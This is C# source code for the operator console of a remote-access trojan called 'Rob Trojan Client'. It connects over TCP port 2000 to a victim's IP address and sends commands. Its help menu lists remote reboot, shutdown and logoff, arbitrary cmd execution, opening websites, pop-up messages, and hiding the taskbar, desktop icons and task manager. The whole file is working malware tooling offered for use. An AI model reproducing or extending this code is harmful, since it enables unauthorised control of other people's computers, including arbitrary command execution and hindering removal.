using System;
using System.Collections.Generic;
using System.Text;
using System.Net.Sockets;
using System.Threading.Tasks;

namespace Trojan_Client
{
    class Program
    {
        public static bool IsConnected;
        public static NetworkStream Writer;
        static void Main(string[] args)
        {
            Console.ForegroundColor = ConsoleColor.Green;
            TcpClient Connector = new TcpClient();
        GetConnection:
            Console.WriteLine("Enter a Server IP:");
            Console.Title = "Rob Trojan Client - Offline";
            string IP = Console.ReadLine();
            try
            {
                Connector.Connect(IP, 2000);
                IsConnected = true;
                Console.Title = "Rob Trojan Client - Online";
                Writer = Connector.GetStream();
            }
            catch
            {
                Console.WriteLine("Error while connecting to the Target! Press any Key to try again!");
                Console.ReadKey();
                Console.Clear();
                goto GetConnection;
            }
            Console.WriteLine("Connection successfully established to " + IP + ".");
            Console.WriteLine("Type HELP for a list of commands.");
            while (IsConnected)
            {
                Console.WriteLine("Enter command : ");
                string CMD = Console.ReadLine();
                if (CMD == "HELP")
                {
                    Console.WriteLine("COMMANDS");

                    Console.WriteLine("Essential!");

                    Console.WriteLine("OPENSITE!!!!---http://example.com");

                    Console.WriteLine("MESSAGE!!!!---message here");

                    Console.WriteLine("REBOOT!!!!---Time Here");

                    Console.WriteLine("SHUTDOWN!!!!---Time Here");
                    
                    Console.WriteLine("CMDCOMMAND!!!!---Command Here");
                    
                    Console.WriteLine("LOGOFF!!!!---");

                    Console.ReadKey();

                    Console.Clear();

                    Console.WriteLine("Fun Commands!");

                    Console.WriteLine("HIDETASKBAR!!!!---");

                    Console.WriteLine("SHOWTASKBAR!!!!---");
                    
                    Console.WriteLine("HIDEDESKTOPICONS!!!!---");
                    
                    Console.WriteLine("SHOWDESKTOPICONS!!!!---");
                    
                    Console.WriteLine("HIDETASKMANAGER!!!!---");
                    
                    Console.WriteLine("SHOWTASKMANAGER!!!!---");

                    Console.ReadKey();

                    Console.Clear();
                }
                else
                {
                    SendCommand(CMD);
                }
            }
        }
                
            public static void SendCommand(string Command)
            {
                try
                {
                    byte[] Packet = Encoding.ASCII.GetBytes(Command);
                    Writer.Write(Packet, 0, Packet.Length);
                    Writer.Flush();
                }
                catch
                {
                IsConnected = false;
                Console.WriteLine("Disconnected from Server!");
                Console.ReadKey();
                Writer.Close();
                }

            }
        }
    }
